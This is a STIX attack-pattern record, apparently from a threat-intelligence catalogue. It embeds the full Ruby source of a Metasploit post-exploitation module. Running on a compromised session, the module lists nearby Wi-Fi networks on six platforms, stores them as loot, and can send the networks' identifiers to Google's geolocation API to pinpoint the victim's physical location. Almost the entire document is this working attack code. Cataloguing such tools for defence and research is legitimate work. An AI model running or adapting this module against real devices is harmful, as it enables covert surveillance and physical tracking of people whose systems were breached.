{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6efb2dfd-8250-4486-94c0-90cfa52fd92d",
    "created": "2024-08-14T16:33:19.160793Z",
    "modified": "2024-08-14T16:33:19.160797Z",
    "name": "Multiplatform WLAN Enumeration and Geolocation",
    "description": " Enumerate wireless networks visible to the target device. Optionally geolocate the target by gathering local wireless networks and performing a lookup against Google APIs.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/wlan_geolocate.rb",
            "external_id": "wlan_geolocate.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multiplatform WLAN Enumeration and Geolocation',\n        'Description' => %q{\n          Enumerate wireless networks visible to the target device.\n          Optionally geolocate the target by gathering local wireless networks and\n          performing a lookup against Google APIs.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Tom Sellers <tom[at]fadedcode.net>'],\n        'Platform' => %w[android osx win linux bsd solaris],\n        'SessionTypes' => [ 'meterpreter', 'shell' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              android_*\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptBool.new('GEOLOCATE', [ false, 'Use Google APIs to geolocate Linux, Windows, and OS X targets.', false]),\n        OptString.new('APIKEY', [ false, 'Key for Google APIs if error is received without one.', '']),\n      ]\n    )\n  end\n\n  def get_strength(quality)\n    # Convert the signal quality to signal strength (dbm) to be sent to\n    # Google.  Docs indicate this should subtract 100 instead of the 95 I\n    # am using here, but in practice 95 seems to be closer.\n    signal_str = quality.to_i / 2\n    signal_str = (signal_str - 95).round\n    return signal_str\n  end\n\n  def parse_wireless_win(listing)\n    wlan_list = []\n    raw_networks = listing.split(\"\\r\\n\\r\\n\")\n\n    raw_networks.each do |network|\n      details = network.match(/^SSID \\d+ : ([^\\r\\n]*).*?BSSID 1\\s+: (\\h{2}:\\h{2}:\\h{2}:\\h{2}:\\h{2}:\\h{2}).*?Signal\\s+: (\\d{1,3})%/m)\n      if !details.nil?\n        strength = get_strength(details[3])\n        wlan_list << [ details[2], details[1], strength ]\n      end\n    end\n\n    return wlan_list\n  end\n\n  def parse_wireless_linux(listing)\n    wlan_list = []\n    raw_networks = listing.split('Cell ')\n\n    raw_networks.each do |network|\n      details = network.match(/^\\d{1,4} - Address: (\\h{2}:\\h{2}:\\h{2}:\\h{2}:\\h{2}:\\h{2}).*?Signal level=([\\d-]{1,3}).*?ESSID:\"([^\"]*)/m)\n      if !details.nil?\n        wlan_list << [ details[1], details[3], details[2] ]\n      end\n    end\n\n    return wlan_list\n  end\n\n  def parse_wireless_osx(listing)\n    wlan_list = []\n    raw_networks = listing.split(\"\\n\")\n\n    raw_networks.each do |network|\n      network = network.strip\n      details = network.match(/^(.*(?!\\h\\h:))\\s*(\\h{2}:\\h{2}:\\h{2}:\\h{2}:\\h{2}:\\h{2})\\s*([\\d-]{1,3})/)\n      if !details.nil?\n        wlan_list << [ details[2], details[1], details[3] ]\n      end\n    end\n\n    return wlan_list\n  end\n\n  def perform_geolocation(wlan_list)\n    if wlan_list.blank?\n      print_error('Unable to enumerate wireless networks from the target.  Wireless may not be present or enabled.')\n      return\n    elsif datastore['APIKEY'].empty?\n      print_error('Google API key is required.')\n      return\n    end\n    g = Rex::Google::Geolocation.new\n    g.set_api_key(datastore['APIKEY'])\n    wlan_list.each do |wlan|\n      g.add_wlan(wlan[0], wlan[2]) # bssid, signalstrength\n    end\n\n    begin\n      g.fetch!\n    rescue RuntimeError => e\n      print_error(\"Error: #{e}\")\n    else\n      print_status(g.to_s)\n      print_status(\"Google Maps URL: #{g.google_maps_url}\")\n    end\n  end\n\n  # Run Method for when run command is issued\n  def run\n    case session.platform\n    when 'windows'\n      listing = cmd_exec('netsh wlan show networks mode=bssid')\n      if listing.nil?\n        print_error('Unable to generate wireless listing.')\n        return nil\n      else\n        store_loot('host.windows.wlan.networks', 'text/plain', session, listing, 'wlan_networks.txt', 'Available Wireless LAN Networks')\n        # The wireless output does not lend itself to displaying on screen for this platform.\n        print_good('Wireless list saved to loot.')\n        if datastore['GEOLOCATE']\n          wlan_list = parse_wireless_win(listing)\n          perform_geolocation(wlan_list)\n          return\n        end\n      end\n\n    when 'osx'\n      listing = cmd_exec('/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s')\n      if listing.nil?\n        print_error('Unable to generate wireless listing.')\n        return nil\n      else\n        store_loot('host.osx.wlan.networks', 'text/plain', session, listing, 'wlan_networks.txt', 'Available Wireless LAN Networks')\n        print_good(\"Target's wireless networks:\\n\\n#{listing}\\n\")\n        if datastore['GEOLOCATE']\n          wlan_list = parse_wireless_osx(listing)\n          perform_geolocation(wlan_list)\n          return\n        end\n      end\n\n    when 'linux'\n      listing = cmd_exec('iwlist scanning')\n      if listing.nil?\n        print_error('Unable to generate wireless listing.')\n        return nil\n      else\n        store_loot('host.linux.wlan.networks', 'text/plain', session, listing, 'wlan_networks.txt', 'Available Wireless LAN Networks')\n        # The wireless output does not lend itself to displaying on screen for this platform.\n        print_good('Wireless list saved to loot.')\n        if datastore['GEOLOCATE']\n          wlan_list = parse_wireless_linux(listing)\n          perform_geolocation(wlan_list)\n          return\n        end\n      end\n\n    when 'solaris'\n      listing = cmd_exec('dladm scan-wifi')\n      if listing.blank?\n        print_error('Unable to generate wireless listing.')\n        return nil\n      else\n        store_loot('host.solaris.wlan.networks', 'text/plain', session, listing, 'wlan_networks.txt', 'Available Wireless LAN Networks')\n        print_good(\"Target's wireless networks:\\n\\n#{listing}\\n\")\n        print_error(\"Geolocation is not supported on this platform.\\n\\n\") if datastore['GEOLOCATE']\n        return\n      end\n\n    when 'bsd'\n      interface = cmd_exec(\"dmesg | grep -i wlan | cut -d ':' -f1 | uniq\")\n      # Printing interface as this platform requires the interface to be specified\n      # it might not be detected correctly.\n      print_status(\"Found wireless interface: #{interface}\")\n      listing = cmd_exec(\"ifconfig #{interface} scan\")\n      if listing.blank?\n        print_error('Unable to generate wireless listing.')\n        return nil\n      else\n        store_loot('host.bsd.wlan.networks', 'text/plain', session, listing, 'wlan_networks.txt', 'Available Wireless LAN Networks')\n        print_good(\"Target's wireless networks:\\n\\n#{listing}\\n\")\n        print_error(\"Geolocation is not supported on this platform.\\n\\n\") if datastore['GEOLOCATE']\n        return\n      end\n    when 'android'\n      log = client.android.wlan_geolocate\n      listing = ''\n      wlan_list = []\n      log.each do |x|\n        mac = x['bssid']\n        ssid = x['ssid']\n        ss = x['level'].to_s\n        listing += \"BSSID: #{mac}\\n\"\n        listing += \"SSID: #{ssid}\\n\"\n        listing += \"Strength: #{ss}\\n\\n\"\n        wlan_list << [mac, ssid, ss]\n      end\n      if listing.blank?\n        print_error('Unable to generate wireless listing.')\n        return nil\n      end\n      store_loot('host.android.wlan.networks', 'text/plain', session, listing, 'wlan_networks.txt', 'Available Wireless LAN Networks')\n      print_good(\"Target's wireless networks:\\n\\n#{listing}\\n\")\n      if datastore['GEOLOCATE']\n        perform_geolocation(wlan_list)\n        return\n      end\n    else\n      print_error(\"The target's platform, #{session.platform}, is not supported at this time.\")\n      return nil\n    end\n  rescue Rex::TimeoutError, Rex::Post::Meterpreter::RequestError\n  rescue ::Exception => e\n    print_status(\"The following Error was encountered: #{e.class} #{e}\")\n  end\n\nend\n",
    "x_mitre_platforms": [
        "%w[android osx win linux bsd solaris]"
    ]
}